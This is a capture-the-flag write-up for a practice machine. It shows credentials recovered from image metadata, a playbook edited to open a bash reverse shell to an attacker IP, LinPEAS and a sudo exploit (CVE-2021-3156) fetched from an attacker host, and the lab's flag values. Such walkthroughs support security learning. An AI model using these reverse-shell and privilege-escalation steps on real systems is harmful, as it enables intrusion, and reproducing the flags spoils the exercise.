@@ -1,0 +1,72 @@
+1. Initial Reconnaissance & Forensics
+The target hosted a cat gallery on Port 80. To look for hidden data, I scraped the images:
+
+Bash
+wget -r -A .jpg,.png http://catpictures-ii.thm/
+Using exiftool to audit metadata, I discovered a hidden "Note to Self" in one of the image files. This note contained credentials for the Gitea service:
+
+User: samarium
+
+Password: TUmhyZ37CLZrhP
+
+Discovery: The note also highlighted an OliveTin instance on port 1337.
+
+  flag1: 10d916eaea54bb5ebe36b59538146bb5
+
+2. Gitea & Infrastructure as Code (IaC) Exploitation
+Logging into Gitea, I found a repository used for server management. The OliveTin configuration revealed that the "Run Ansible Playbook" button was hardcoded to execute:
+git -C /root/ansible pull && ansible-playbook /root/ansible/playbook.yaml
+
+The Reverse Shell Attempt
+I attempted to gain a root shell by modifying the playbook.yaml file within the Gitea web interface. I added a task to execute a bash reverse shell back to my Kali machine:
+
+YAML
+- name: Exploit
+  hosts: localhost
+  tasks:
+    - name: Reverse Shell
+      shell: bash -i >& /dev/tcp/192.168.148.149/4444 0>&1
+
+  flag2: 5e2cafbbf180351702651c09cd797920
+3. Local Enumeration with LinPEAS
+To identify the path to root, I transferred LinPEAS from my Kali machine:
+
+Bash
+# On Kali
+python3 -m http.server 80
+
+# On Target
+wget http://[KALI_IP]/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh
+Key LinPEAS Findings:
+OliveTin Config: LinPEAS flagged /etc/OliveTin/config.yaml, which revealed that the "Run Ansible Playbook" button executed a git pull followed by ansible-playbook as root.
+
+Vulnerable Sudo: The sudo version was flagged as vulnerable to CVE-2021-3156 (Baron Samedit).
+
+Network Restrictions: LinPEAS confirmed the machine had no outbound internet access, explaining why the Gitea/Ansible "intended" path was failing (it couldn't pull the updated repo).
+
+4. Privilege Escalation: Baron Samedit
+Since the Ansible/OliveTin loop was broken by the network firewall, I pivoted to the sudo vulnerability discovered by LinPEAS.
+
+Exploit Strategy:
+Transfer: I hosted the Python-based NSS exploit (exploit_nss.py) on my Kali machine.
+
+Download: On the target, I fetched the exploit:
+
+Bash
+wget http://[KALI_IP]/exploit_nss.py
+Execution: I ran the exploit using Python 3:
+
+Bash
+python3 exploit_nss.py
+The exploit successfully triggered a heap overflow in sudoedit, dropping me into a root shell.
+
+5. Capturing the Flag
+With root access, I headed to the root directory to find the final flag:
+
+Bash
+# whoami
+root
+# cat /root/flag3.txt
+6d2a9f8f8174e86e27d565087a28a971
